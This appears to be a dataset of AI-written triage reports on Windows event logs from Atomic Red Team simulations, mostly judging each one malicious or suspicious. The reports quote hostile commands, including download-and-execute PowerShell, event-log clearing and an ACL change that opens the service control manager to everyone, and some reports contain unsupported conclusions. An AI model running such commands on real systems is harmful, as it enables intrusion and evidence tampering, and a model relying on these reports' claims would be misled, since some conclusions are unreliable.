SOAPHound - Dump BloodHound Data,"Upon reviewing the logs provided, we can note several key points of interest that indicate potential malicious activity:

1. **Event Logs Cleared**: There are multiple events indicating the clearing of event logs across different channels (System, Windows PowerShell, and Security logs). Specifically, these are Event IDs 104 for System and PowerShell, and Event ID 1102 for Security. These actions are performed by the user `admin_test` on `Server002`. The clearing of logs is typically considered a suspicious activity as it can indicate an attempt to cover up tracks of potentially malicious actions.

2. **Execution of Suspicious PowerShell Script**: The PowerShell logs show the execution of `SOAPHound.exe` through a command initiated via PowerShell. This executable is run from a temporary directory, and its command line arguments indicate potential credential dumping or harvesting (`--bhdump`) which is a common tactic in malicious operations.

3. **Usage of `wevtutil.exe` for Clearing Logs**: The Sysmon logs record the execution of `wevtutil.exe` with the command line arguments to clear logs from multiple channels. The use of `wevtutil.exe` to clear logs aligns with the behavior noted in the Windows Event logs. This reinforces the suspicion of an intention to remove traces of activity.

4. **High Integrity Level and Privilege Indication**: The operations performed by `admin_test` are conducted under a high integrity level. Coupled with log clearance actions, this suggests elevated privileges were used, which can be indicative of privilege escalation tactics.

5. **No Benign Explanation**: The combination of clearing event logs, execution of a potentially malicious script, and usage of legitimate tools like `wevtutil.exe` in a context that is usually flagged as covering tracks, present no clear benign explanation.

Given these observations, the activities captured in these logs are concerning and indicate malicious attempts or potential compromise on the system. Specifically, the actions point toward efforts to execute unauthorized actions and subsequently remove evidence.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- **Immediate Incident Response**: Initiate an incident response procedure to isolate the affected system to prevent further compromise or lateral movement within the network.
- **Forensic Analysis**: Collect and preserve evidence for forensic analysis. Investigate the source and origin of `SOAPHound.exe` and other related file activities.
- **Review Access Controls**: Assess and remediate any compromised accounts, especially the `admin_test` user account. Ensure multi-factor authentication is in effect.
- **Implement Monitoring**: Enhance monitoring on critical systems and logs. Look for similar indicators across other networked systems.
- **Patch and Secure Systems**: Ensure all systems are patched and vulnerabilities exploited by this attack are remediated.
- **Awareness and Training**: Increase awareness and provide training to administrators about tactics used in such attacks, including log clearing and suspicious script execution."
Simulate BlackByte Ransomware Print Bombing,"### Analysis:

The provided event logs show several indicators of potentially malicious activity. Here, I will outline key points found in the logs that suggest malicious behavior:

1. **Log Clearing Events**:
   - Multiple logs have been cleared almost simultaneously by the user `admin_test`, which is suspicious. Typically, normal operations do not involve clearing event logs, especially multiple ones in quick succession. Logs were cleared for the `System`, `Windows PowerShell`, and `Security` channels (`EventID: 104` and `1102`).
   
2. **Unusual PowerShell Execution**:
   - A PowerShell script is executed with a command that loops 75 times to start `wordpad.exe` using a PowerShell command (`EventID: 1`). The command appears to be a scripted automation or potentially an exploit, indicative of anomalous behavior.
   - This execution originates from a user context `SERVER002\admin_test` and has elevated integrity (High), indicating potential privilege escalation or misuse of privileges (`EventID: 1`).

3. **Process Creation Pattern**:
   - `wordpad.exe` instances have been started repeatedly in a loop driven by PowerShell, and command line references to ""AtomicRedTeam"" suggest the use of a penetration testing or adversarial simulation toolkit. This directly suggests deliberate execution of test scripts or adversarial techniques.

4. **Security Auditing Events**:
   - Several security auditing events (`EventID: 4798`) occur in a short span related to user `admin_test`. These events capture activities related to group membership enumeration, often leveraged during reconnaissance phases of attacks.

5. **Environmental Context**:
   - The consistent association with the user `admin_test` suggests that either this account or someone using it could be engaging in unauthorized activities. The involvement in log clearing, spawning numerous processes, and executing scripts points towards misuse.

### Assessment:

This evidence collectively suggests a strong likelihood of malicious actions facilitated by or via the account `admin_test`. The behaviors observed are characteristic of adversary simulation, possibly by internal penetration testing exercises or unauthorized red-team activities. The following points strongly indicate this:
- Execution and repeated launching of `wordpad.exe` in a scripted loop.
- Multiple event logs being cleared deliberately.
- Use of `cmd.exe` and PowerShell scripts with suspicious payloads.

### Resolution:

- **MALICIOUS**: The logs contain clear indicators of abnormal and unauthorized activity with a strong potential for malicious intent. Immediate action is warranted to investigate and contain potential threats.

### Guidance for Proceeding:

1. **Immediate Actions**:
   - Suspend `admin_test` account and initiate a credential reset to prevent further unauthorized access.
   - Isolate the host `Server002` to prevent further propagation, if under active misuse.
   - Review the organization's active security measures for signs of penetration testing activities that are unsanctioned.

2. **Further Investigation**:
   - Determine the origin of the scripts and verify if they are part of legitimate security testing or otherwise.
   - Conduct a thorough audit of the `admin_test` account for past activities and changes in permissions.
   - Engage with incident response teams to gather more contextual intelligence and assess any lateral movement or additional compromised systems.

3. **Preventative Measures**:
   - Reinforce auditing policies, especially around log clearing and PowerShell script execution.
   - Implement stronger controls and monitoring around privileged accounts, particularly those with administration privileges.
   - Consider additional training for staff on responsible testing methods and clear demarcation of legitimate testing activities."
Mirror Blast Emulation,"Upon reviewing the provided event logs for the specified Windows host, several activities can be highlighted for further investigation:

1. **Log Cleared Events:**
   - Windows event logs indicate that multiple log channels, including the Security and System logs, have been cleared by a user named `admin_test`. This action is captured in both the Security (Event ID 1102) and System logs (Event ID 104). 
   - Clearing of logs, particularly by an admin account, might indicate an attempt to cover tracks and is considered a hallmark of potentially malicious behavior.

2. **Usage of `wevtutil` Command:**
   - Multiple entries show execution of `wevtutil.exe`, which is used to manage event logs. The commands executed were to clear the following logs: Sysmon/Operational, Application, System, Security, and ""Windows PowerShell"". These executions were performed by the `admin_test` user with high integrity level permissions.
   - Frequent and successive clearing of various logs is abnormal for standard system operations and further supports the theory of an attempt to hide malicious activity.

3. **Suspicious PowerShell Activity:**
   - A suspicious PowerShell command was executed. It involves directly modifying registry keys related to `VBAWarnings`, which might indicate an attempt to tamper with Excel security settings. The command was launched by `powershell.exe` with an unusual command line argument referencing a path within the `Temp` directory.
   - The command seems to pertain to an Atomic Red Team emulation activity. The execution of such payloads without proper authorization on a production server could be a preliminary stage of a controlled simulation attack to test security controls or could be malicious if not sanctioned within the environment.

4. **System Time Changes:**
   - Multiple time change events, although logged as done by ""LOCAL SERVICE"", with svchost.exe as the process, this could still be benign. Often such time changes are linked to synchronization with an external time server and are regular Windows operations. However, frequent time changes in combination with other malicious indicators could represent an attempt to obscure the timeline of exploitative activities.

### Risk Assessment and Guidance:
Based on the investigation, these logs present multiple indicators of potential malicious behavior:

- The deliberate clearing of event logs, especially Security logs, strongly suggests malicious intent under typical scenarios unless conducted with prior approvals for maintenance.
- The series of executed wevtutil commands points to an inherent attempt to obfuscate activities.
- The suspicious PowerShell command line further hints at activities that need more exploration to ensure they are approved simulation activities such as penetration tests or otherwise malicious.

**Resolution: MALICIOUS**

### Recommended Next Steps:
1. **Immediately Isolate the Host**: To prevent further compromise or data loss, isolate the host from the network.
2. **Forensic Imaging**: Create a forensic image of the affected system for further analysis.
3. **Review Authentication Logs**: Verify any suspicious account activity, especially for the `admin_test` account. Consider forced password changes and assessing account permissions.
4. **Threat Hunting**: Conduct a deeper review of network, endpoint, and SIEM logs for any related activities.
5. **Incident Report and Communication**: Prepare an incident report and notify internal security teams and management for coordination of response actions.
6. **Security Audit**: Review and audit security policies, permissions, and procedures, including the evaluation of logging policies to avoid future log tampering."
Encoded VBS code execution,"Upon analyzing the provided Windows event logs, several indicators of suspicious or potentially malicious activity are evident:

1. **Suspicious PowerShell Activity**: 
   - Multiple PowerShell events (Event ID 600) indicate the execution of a script that downloads and executes a PowerShell script from a GitHub repository. The use of `IEX (iwr ... -UseBasicParsing)` to execute a script from the internet without validation is a common technique used by attackers to introduce malware.
   - The specific script mentioned is `Invoke-MalDoc.ps1`, which is associated with Red Canary's Atomic Red Team simulations. However, in a real-world scenario, downloading and executing scripts from the internet without proper verification is indicative of potentially malicious behavior if not part of a controlled exercise.

2. **Event Log Clearing**:
   - Security log (Event ID 1102) and System log (Event ID 104) entries show that the logs were cleared by the user `admin_test`. Log clearing is a common tactic used by attackers to cover their tracks post-compromise, especially when it’s performed shortly after suspicious activities.

3. **Frequent Use of Wevtutil**:
   - The Sysmon logs (Event ID 1 and 5) indicate frequent use of `wevtutil.exe` to clear various event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). The command `wevtutil.exe cl` followed by the log name is used to clear logs, which aligns with the observed log clearing events.

4. **High Integrity Level Processes**:
   - The logs show that many actions were performed under a high integrity level by the user `SERVER002\\admin_test`—a potential sign of privilege misuse or escalation.

Given these findings, it is highly probable that these logs contain evidence of malicious activity. These events suggest that there may have been an attempt to execute unauthorized scripts with potentially harmful payloads, alongside actions to conceal these operations by clearing the associated logs.

**Resolution**: MALICIOUS

**Recommendations for Next Steps**:
- **Immediate Containment**: Isolate the impacted host (`Server002`) from the network to prevent further malicious activities.
- **Conduct Further Forensics**: Perform a detailed investigation of the host, inspecting the files and scripts mentioned in the logs, and retrieve any residual malicious payloads for analysis.
- **Review and Audit Access Logs**: Determine if similar activities are present on other machines in the network.
- **User Education**: Reinforce training and awareness programs on the risks of executing unverified scripts and maintaining proper log management practices.
- **Security Controls**: Implement or tighten security controls around PowerShell execution, such as enforcing Constrained Language Mode, logging through script block logging, and using Just Enough Administration (JEA) to minimize administrative access."
PowerShell Session Creation and Use,"After reviewing the provided logs, below are my observations and analysis:

### Suspicious or Anomalous Behavior

1. **Clearing of Event Logs:**
   - The logs show entries indicating that the ""admin_test"" user cleared multiple event logs (Security EventID 1102, System EventID 104, and Windows PowerShell EventID 104). Clearing logs is often an attempt to cover traces of malicious activity.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility was used multiple times to clear different event logs (`Microsoft-Windows-Sysmon`, `Application`, `System`, `Security`). The `wevtutil` tool is a legitimate sysadmin tool, but repeated use to clear logs, especially during a short time frame, is suspicious.
   
3. **PowerShell Activity:**
   - The execution of PowerShell commands that appear to be creating and removing a file (`T1086_PowerShell_Session_Creation_and_Use`) in the Temp directory indicates possible malicious behavior, typically aligned with TTPs (Tactics, Techniques, and Procedures) used in attacks to execute and remove traces.

4. **Anonymous Logons:**
   - There are multiple `ANONYMOUS LOGON` events (Security EventID 4624) which could indicate suspicious activity, as anonymous logons are not common in secured environments.

5. **Repeated use of system binaries:**
   - The system binaries such as `conhost.exe`, `whoami.exe`, `hostname.exe`, and `taskhostw.exe` were executed during this timeframe, which aligns in a pattern observed in various reconnaissance and post-exploitation stages of attacks.

### Conclusion

This analysis highlights a range of activities that can be construed as an attempt to conduct an unauthorized reconnaissance and potentially hide malicious activities by clearing logs:

- **Clearing of event logs** is a significant indicator of an attempt to hide evidence of potentially unauthorized actions.
- **Use of powerful scripting environments** like PowerShell with sophisticated scripts can execute a series of actions, including setting up a foothold and moving laterally.
- The number of `ANONYMOUS LOGON` events requires further context as they could indicate an attempt to map services or prepare for subsequent attacks.

### Assessment

Based on the reviewed log entries, this activity is classified as **MALICIOUS**. The behavior seen in the logs is consistent with attempts to gain unauthorized access, cover tracks, and possibly conduct further reconnaissance and exploitation activities.

### Guidance on How to Proceed
- **Isolate the affected machine:** Prevent any further potential lateral movement.
- **Conduct a full investigation:** Deep dive into additional logs, endpoint detection, and network activity.
- **Review user permissions**: Especially for the accounts like ""admin_test"" which had cleared logs.
- **Enhance Monitoring**: Deploy more extensive auditing and alerting mechanisms for specific threat indicators.
- **Remediation and Hardening**: Apply security patches, review policies regarding scripting environments, and disable unnecessary services and accounts.

If required, engage a forensic team for a detailed investigation and consider a comprehensive security audit to improve defenses and prepare for similar attacks in the future."
OSTap Payload Download,"Upon examining the Windows event logs provided, the following observations have been made:

1. **Event Log Clearing**: 
   - There are multiple instances where the event logs for the System, Security, and Windows PowerShell were cleared by the user ""admin_test"" (Event ID 1102 in the Security log and Event ID 104 in the System log). The use of the command-line tool `wevtutil.exe` to clear logs is noted in the Sysmon events.
   - This activity is typically associated with attempts to cover tracks and is considered suspicious behavior.

2. **Unusual Script Execution**:
   - The Sysmon log shows a command executed via `cmd.exe` that creates a script using `echo` and saves it as `OSTapGet.js`, which is then executed using `cscript.exe`. This script involves downloading content from a URL (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt) using `MSXML2.ServerXMLHTTP` and saving it to a file.
   - This behavior resembles a potentially malicious script execution pattern which can be used for downloading or executing arbitrary code, exploiting vulnerabilities, or performing reconnaissance.

3. **Privilege Logon**:
   - Event ID 4672 shows a privileged logon with extensive privileges granted, which, in isolation, might be benign on a system where SYSTEM account operations are expected.
   - However, given the context of other suspicious activities, it merits further investigation.

4. **Edge Update Activities**:
   - There is extensive activity associated with Microsoft's Edge Update. This includes multiple executions of processes like `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, and associated COM registration helpers.
   - While this could be normal activity associated with legitimate updates, it coincides with other unusual activities and should be further scrutinized to rule out misuse or masquerading.

5. **Scheduled Task Manipulation**:
   - Several events indicate manipulation of scheduled tasks via `schtasks.exe`, including deletion and creation of tasks. This type of activity can be indicative of an attacker attempting to maintain persistence via scheduled tasks.

### Assessment:
Based on the event log entries, there are several indicators of potentially malicious activity:

- The clearing of multiple event logs by an administrative user.
- Execution of potentially malicious scripting activity via `cmd.exe` and `cscript.exe`.
- Extensive and suspicious manipulation of scheduled tasks.
- Unusual executions related to the Microsoft Edge Update process.

### Resolution: **SUSPICIOUS**

The observed activities are characteristic of attempts to conceal malicious operations, possibly indicating compromise. Immediate further investigation is necessary, focusing on:

- Verifying the legitimacy and necessity of the cleared logs by the ""admin_test"".
- Detailed review of the scripts executed and any network activity associated with them.
- Examination of user activity for anomalies on parts of the logon and process creations.
- Assessment of any persistence mechanisms installed or altered (e.g., scheduled tasks).
- Considering implementing enhanced monitoring and alert mechanisms for log clearance activities.

A rapid response and containment strategy should be evaluated to protect the integrity of the system while further analysis is conducted."
ATHPowerShellCommandLineParameter -Command parameter variations,"Based on the analysis of the provided logs, several points stand out which indicate potential security issues:

1. **Clearing of Event Logs:** 
   - The Sysmon log data shows command executions such as `wevtutil cl Microsoft-Windows-Sysmon/Operational`, `wevtutil cl Application`, `wevtutil cl System` and `wevtutil cl Security`. These commands clear the respective event logs.
   - The System logs (EventID 104) confirm that the logs for System and PowerShell were cleared.
   - The Security logs indicate that the Security log was also cleared (EventID 1102).

2. **Use of PowerShell with Suspicious Command Line:**
   - The Sysmon log records a PowerShell process (`powershell.exe`) execution with parameters `& {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop}`. Such a command indicates a potential obfuscation technique or unusual behavior that is often suspicious.

3. **Execution of Administrative Tools:**
   - The logs show the `whoami.exe` process was executed. While this is a legitimate tool, when combined with log clearing and unusual PowerShell activity, it suggests an attempt to gather information under compromised circumstances.
   - The execution of `HOSTNAME.EXE` seems benign in isolation, but in context, it could be part of a script or manual investigation by an attacker to gather system information.

4. **Frequent and Automated Logon Events:**
   - Multiple events of different processes involving high integrity levels (`IntegrityLevel: High`) which indicate operations performed with administrative privileges.

**Assessment:**
- **Indicators of Compromise (IoCs)** are present, such as the frequent clearing of logs, use of PowerShell with a potentially obfuscated or unexplained command, and gathering information using system tools.
- While these actions individually could be benign activities performed by an administrator, when they occur together, they raise considerable suspicion of malicious intent, especially since the logs were cleared shortly after actions that could be seen as attempts to hide evidence.

**Resolution:**
- **MALICIOUS**: Given the combination of cleared logs, PowerShell usage with unusual parameters, and the execution of information-gathering commands, there's a high probability that these logs indicate a compromise.

**Guidance:**
- Immediately perform a full security audit on `Server002`, focusing on recent changes, user activity, and network connections.
- Check for unauthorized changes to user accounts or permissions.
- Enhance monitoring on other systems to identify similar patterns or connections to this server.
- Consider deploying forensic tooling to gather detailed data from memory and disk before any potential evidence is lost.
- Review and limit the list of users with elevated privileges to prevent further unauthorized access."
AutoIt Script Execution,"Upon analyzing the Windows event logs provided, several events and activities stand out as potential indicators of malicious activity. Below is a detailed analysis highlighting the key findings:

1. **Log File Clearing Activity**: 
   - Multiple instances of the `wevtutil.exe` command are recorded, specifically targeting the System, Security, and Windows PowerShell event logs for clearing (Sysmon EventID 1 and 5).
   - Security log EventID 1102 indicates clearing of the event log, which is frequently associated with attempts to cover tracks after malicious activity.
   - The user `admin_test` executed these commands, suggesting possible misuse or compromise of this user account.

2. **Use of `wevtutil.exe`**: 
   - This utility was used extensively to clear logs (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl System`, etc.) at multiple instances and these actions are consistently linked to ""SERVER002\\admin_test"" with high integrity level access.
   - Commands to clear logs using `wevtutil.exe` are indicative of log tampering, often seen in post-exploitation activity to hide traces.

3. **PowerShell Execution with AutoIt**:
   - Suspicious PowerShell activity (`EventID 600`) shows execution of AutoIt script (`C:\Program Files (x86)\AutoIt3\AutoIt3.exe`) which is a scripting language used among other purposes for automation and could be leveraged for executing unauthorized scripts.
   - This is associated with `SERVER002\\admin_test`, again linking back to potential misuse or compromise of this account.

4. **Privilege Escalation and Sensitive Privilege Use**: 
   - EventID 4672 in Security logs shows special privileges being assigned to the SYSTEM account (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, among others), indicating potential privilege escalation or execution of processes that require elevated privileges.

5. **Windows Defensive Measures**:
   - Windows Defender was running (Application log EventID 15), but logs indicate potential attempts to circumvent its protections, common in sophisticated attacks.

### Assessment and Resolution:
Considering the factors above, the events suggest deliberate and coordinated attempts to manipulate and hide activity on the system, most likely indicative of a malicious intrusion or internal threat.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Account Audit**: Investigate the `admin_test` account for possible compromise or misuse. Change credentials and review activity history.
- **Remediation Actions**: Identify and isolate affected systems to prevent further spread or damage. Validate system integrity and re-establish security controls.
- **Forensic Analysis**: Conduct a thorough forensic investigation to determine the extent of compromise, assess data integrity, and capture any evidence of unauthorized access.
- **Review Security Controls**: Ensure logging and monitoring systems are properly configured and cannot be easily tampered with. Implement advanced threat detection and continuous monitoring for anomalous behaviors.
- **User and Security Awareness Training**: Conduct training for users and administrators focusing on recognizing and preventing similar threats.

This assessment underscores the importance of active monitoring and fast response to signs of potential system compromise to protect organizational assets."
Snake Malware Service Create,"Upon examining the log entries provided, several activities raise concerns about potential malicious behavior:

1. **Log Clearing Events**: 
   - There are events indicating that logs are being cleared (Event ID 1102 and 104). Specifically, the Security, System, and Windows PowerShell logs are cleared at various times by a user named `admin_test`. Clearing logs is generally suspicious as it suggests an attempt to cover tracks or hide malicious activities.

2. **Process Execution with Command-Line Utilities**: 
   - Multiple instances are observed where the `wevtutil.exe` command is used to clear event logs (CommandLine= `""C:\\Windows\\system32\\wevtutil.exe\"" cl [LogName]`). This is a common technique employed in post-exploitation scenarios to hide traces of compromise.
   - The `cmd.exe` is executed with a command to create a service (`WerFaultSvc`) using `sc.exe` with an unusual binary path (`$env:windir\\WinSxS\\...\\WerFault.exe`). This can be indicative of an attempt to establish persistence by creating a trojan service disguised as a legitimate Windows service.

3. **Use of High-Integrity Command Execution**:
   - The user executing these commands, `SERVER002\\admin_test`, is operating with a high integrity level, suggesting administrative privileges which can enable significant control over the system.

4. **Creation of Suspicious Service**: 
   - A new service named `WerFault Service` is created and set to auto-start. The use of a user-mode service and a non-standard binary path raises suspicion for a covert persistence mechanism.

5. **No PowerShell Logs**: 
   - The absence of PowerShell event logs, especially when there are logs observed being cleared, suggests an attempt to hide potentially malicious scripts or commands executed through PowerShell.

**Assessment**:
- Given the log clearing activities, execution of administrative command-line tools to manipulate logs and create services, and the lack of PowerShell logs, these activities clearly indicate malicious intents on the system.

**Resolution: MALICIOUS**

**Guidance**:
1. Immediately isolate the compromised machine, `Server002`, from the network to prevent further spread.
2. Investigate the user account `admin_test` for signs of unauthorized access or compromise of credentials.
3. Conduct a full forensic analysis of the system to identify any other traces of compromise.
4. Review network logs for any signs of exfiltration or communication to external addresses.
5. Take steps to patch vulnerabilities and harden the security posture of the system and network.
6. Consider involving incident response professionals to assist in a comprehensive investigation and remediation."
Extract Memory via VBA,"Upon analyzing the given logs, several aspects indicate potentially suspicious or malicious activities. Below is a detailed analysis:

### Anomalous and Suspicious Behavior:
1. **PowerShell Activity**: There is an instance where PowerShell is invoked with a suspicious command line:
   - **Command Invocation**: PowerShell is used to execute a script from a URL: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`. This script is often associated with simulated attacks used by red teams to test organizational defenses, as part of the Atomic Red Team tests.
   - **Description**: The command downloads and executes a script designed to mimic document-based malware activity, seen in the `Invoke-Maldoc` function.

2. **Clearing of Event Logs**: 
   - **Security and System Logs Cleared**: The security log was cleared as reflected in Event ID 1102, which can indicate an attempt to cover tracks. Similarly, Event ID 104 indicates that both the System and Windows PowerShell logs were cleared.
   - **User Performing the Action**: The user account `admin_test` is responsible for these actions, which might indicate either a compromised account or malicious behavior by the user.

3. **Usage of `wevtutil`**:
   - The execution of the `wevtutil cl` command, as seen in logs, is used to clear the event logs (e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). This supports the evidence of log clearance.

4. **User Execution Context**:
   - Several processes, including the suspicious PowerShell execution, operate under `admin_test`. The execution integrity level for these processes is 'High', suggesting they have significant privileges.

### Assessment:
- The combination of executing a known red team simulation script via PowerShell, paired with the clearing of event logs, strongly indicates mimicry of threat actor behavior in test or actual malicious activities. While the URLs and executions could be part of a legitimate security test, the absence of upfront context strongly leans toward suspicious activities, especially given the obfuscation through event log clearance.

### Resolution:
Given the identified activities, the context and risk factors point toward a **SUSPICIOUS** resolution. Further investigation is necessary to determine if the behavior was part of authorized testing or if unauthorized actions were taken:

1. **Confirm Intentions**: Verify with the IT/security team if this was part of scheduled penetration testing or an exercise using the Atomic Red Team framework.
2. **User Account Verification**: Check the integrity and security posture of the account `admin_test` for potentially compromised access or unauthorized usage.
3. **Network and Endpoint Monitoring**: Ensure telemetry data is monitored for unusual outbound connections or activities not aligned with standard operations, especially any outbound PowerShell requests.
4. **Reinstate Logging**: Immediately ensure logging mechanisms are re-enabled and protected from unauthorized clearing. Consider enhancing log monitoring for better visibility.
5. **Incident Response Protocol**: If this is an unauthorized activity, initiate the company's incident response protocol to mitigate any potential damage and investigate further.

Proceed with caution and ensure all findings are documented as part of an ongoing investigation into these events."
Maldoc choice flags command execution,"Upon analyzing the provided Windows event logs, the following observations are noted:

1. **Event Log Clearing**:
   - Several instances of event logs being cleared are noted across different channels, including System, Windows PowerShell, and Security logs. This is generally abnormal behavior, particularly if conducted without a legitimate reason or routine.

2. **PowerShell Activity**:
   - The `PowerShell` logs indicate the execution of a command with potentially malicious intent. The command attempts to download and execute a script from an external URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`). This behavior is highly suspicious and aligns with tactics used by attackers to download and execute malicious scripts.

3. **Use of `wevtutil.exe`**:
   - There is evidence of the `wevtutil.exe` command utility being used multiple times to clear the logs (`cl` command). This command-line utility can clear event logs, which is a technique often used to hide traces of malicious activities.

4. **Suspicious Process Creation**:
   - The event logs capture several executable files running commands often associated with scripts or system utilities (e.g., `whoami.exe`, `hostname.exe`, `conhost.exe`). While they might be legitimate, their execution, in conjunction with other suspicious activities, raises concern.
   - The PowerShell process spawned by `wsmprovhost.exe`, with commands referencing external URLs and executing shell commands, is particularly concerning.

5. **Command-line Arguments in PowerShell**:
   - The PowerShell command appears to modify security settings and invoke a command which typically would prompt a user (using `choice /C Y /N /D Y /T 3`). This seems crafted to bypass user intervention.

Given the evidence of event log clearing, external script execution attempts, and the PowerShell activity with potentially harmful commands, this analysis concludes:

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Isolate the Affected System**: Immediately isolate the system (Server002) from the network to prevent any potential spread of malicious activities to other systems.
   
2. **Conduct a Full Malware Sweep**: Use trusted anti-malware tools to perform a comprehensive scan of the system to identify and mitigate any malicious files or activities.

3. **Examine Network Traffic**: Investigate outbound network traffic for unusual patterns or connections to suspicious domains/IPs.

4. **Review User Activity**: Check additional logs and access management to identify if the user account `admin_test` had unauthorized usage or any other compromised accounts on the network.

5. **Restore from Backup**: If there is confirmed evidence of compromise, consider restoring the system from a known clean backup after ensuring no backdoors or persistent threats remain.

6. **Implement Logging and Monitoring**: Ensure robust logging is enabled and monitored for any future activities, particularly focusing on PowerShell and executable commands. 

7. **User Education and Policies**: Regularly educate users on security best practices and enforce strict access controls to reduce the risk of future incidents."
OSTAP JS version,"From the review of the provided Windows event logs, several indicators of potentially malicious activity stand out:

1. **PowerShell Activity**:
    - Multiple instances of PowerShell processes are seen executing a command that uses `iwr` (Invoke-WebRequest) to download a script from `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`. 
    - This script is known as part of the Atomic Red Team framework, often used for adversary simulation. However, attackers can leverage such frameworks as well.
    - The command ultimately attempts to create a JavaScript file and execute it with `wscript.exe`, which is typically indicative of malicious behavior, as this could be an attempt to execute scripts with additional payloads.

2. **Event Log Clearing**:
    - The logs show multiple instances where the Windows Event logs (System, PowerShell, and Security) have been cleared by the user `admin_test`. 
    - Clearing event logs is often an indication of attempts to cover tracks by an attacker post-compromise or during lateral movement.

3. **Anomalous Wevtutil Execution**:
    - The `wevtutil.exe` utility is seen accessing and interacting with various event logs. While access itself isn't inherently malicious, conjunction with event clearing warrants attention.

4. **Elevated Privileges**:
    - The logs reflect processes executed with high integrity levels, including those related to the `whoami.exe` and `hostname.exe` commands. While these commands are benign in isolation, their presence in conjunction with event clearing and PowerShell activity makes them part of the pattern suggestive of recon or privilege abuse.

Based on the above observations, the activities in the logs indicate a high likelihood of malicious behavior. The execution of potentially malicious scripts via PowerShell in conjunction with event log clearing strongly suggests an attempt at stealthy, unauthorized actions on the host.

**Resolution**: MALICIOUS

**Guidance**:
1. Immediately isolate the affected machine from the network to prevent further unauthorized access or lateral movement.
2. Conduct a forensic analysis of the system to determine the extent of the compromise and identify any additional persistence mechanisms or payloads.
3. Perform threat hunting on the network to locate any other systems that might be affected by similar behavior.
4. Review and strengthen security measures around PowerShell execution policies, logging, and user privilege management to prevent similar incidents in the future.

Excel 4 Macro,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity have been identified:

1. **Log File Clearing Activity**: 
   - Multiple logs indicate the clearance of event logs (System, PowerShell, Security) by a user named ""admin_test"". Event logs are crucial for forensic investigations, and clearing them is a common tactic used by malicious actors to hide their tracks.
   - The `LogFileCleared` events with `EventID: 104` and `EventID: 1102` in the System and Security logs demonstrate this suspicious behavior.

2. **Suspicious PowerShell Activity**:
   - Execution of PowerShell with certain arguments indicates potentially malicious scripts. The script identified in the PowerShell logs and `Sysmon` events involve downloading and executing binaries (`procexp.exe` from a remote URL) using PowerShell. This type of behavior is often associated with malware deployment or lateral movement within a network.
   - The `CommandLine` entries in the Sysmon logs for PowerShell show a complex script (indicative of an Atomic Red Team technique) aiming to create temporary files and leveraging COM objects for execution, which is highly suspicious.

3. **Use of `wevtutil.exe`**:
   - `wevtutil.exe` is a legitimate Windows utility used for managing event logs. However, its use in clearing critical logs, as demonstrated in numerous events here, aligns with common tactics employed in malicious operations.

4. **Execution of System Utilities Might Be Suspicious**:
   - Multiple events indicate the execution of system utilities such as `whoami.exe`, `hostname.exe`. While these tools are legitimate, they are often used by attackers for situational awareness on compromised systems.

5. **High Integrity Level Execution**:
   - The repeated use of PowerShell and other commands executed with high integrity, aligned with clearing events and suspicious PowerShell scripts, enhance the suspicion that admin-level credentials were used for unauthorized or malicious purposes.

**Assessment**:
Based on the clearing of event logs, suspicious execution of PowerShell scripts, and inappropriate use of `wevtutil.exe` to hide activities, there is strong evidence of malicious activity.

**Resolution**: **MALICIOUS**

**Guidance**:
1. **Immediate Containment**: Isolate the affected host from the network to prevent further compromise or spread.
2. **Credential Analysis**: Investigate the ""admin_test"" account for unauthorized access or compromise.
3. **Investigate Network Activity**: Check network logs to determine whether any data exfiltration occurred and trace any external connections made by the PowerShell script.
4. **Endpoint Monitoring**: Implement endpoint detection and response solutions to identify and block similar attempts in the future.
5. **Log Review and Policy Update**: Assess logging and monitoring policies to ensure critical activities are logged and reviewed, maintaining a timeline of important events for any future incidents."
Modifying ACL of Service Control Manager via SDET,"### Detailed Analysis:

The Windows event logs provided reveal potentially suspicious activities that warrant further investigation:

1. **Event Log Clearing Activity**:
   - Security Log and System Log entries show Event ID 1102 (Security Log cleared) and Event ID 104 (System Log and Windows PowerShell Log cleared) performed by the user `admin_test`. The use of `wevtutil.exe cl` in the CommandLine fields of Sysmon logs corroborates the clearing of these logs.
   - This suggests an attempt to cover tracks, which is a common tactic used by malicious actors.

2. **Service Control Manager Permissions**:
   - An instance of `cmd.exe` executing `sc.exe sdset scmanager D:(A;;KA;;;WD)`. This command alters the permissions of the service control manager, granting full control (`KA` - `Key All Access`) to all users (`WD` - `World`).
   - This behavior can potentially be used for privilege escalation or maintaining persistence in a compromised system and is often seen in malicious activities.

3. **Frequent Usage of System Utilities**:
   - Numerous executions of system utilities such as `Sysmon`, `whoami.exe`, `hostname.exe`, and `EdgeUpdate` services, possibly to query network and user information or maintain software updates. While Sysmon captures these events, the excessive utilities usage, especially the running of `whoami.exe` and `hostname.exe` frequently, might suggest reconnaissance activity.

4. **Microsoft Edge Update Processes**:
   - Multiple entries for `MicrosoftEdgeUpdate.exe` with different command-line arguments across Sysmon logs. Although these could relate to legitimate software updates, the context suggests an abuse or a staged persistence mechanism due to their high frequency and correlation with log clearing activity.

5. **Time Change Events**:
   - Security event 4616 captures a brief time change between PreviousTime and NewTime. Although not inherently malicious, repeated and unexplained time changes can indicate attempts to circumvent scheduled scans or logging times.

### Assessment:

Given the combination of event log clearing, permission changes to the service control manager, and potential misuse of system utilities, there are indicators that the machine might be compromised or has undergone suspicious activities aimed at maintaining unauthorized access or escalation of privileges.

### Resolution:

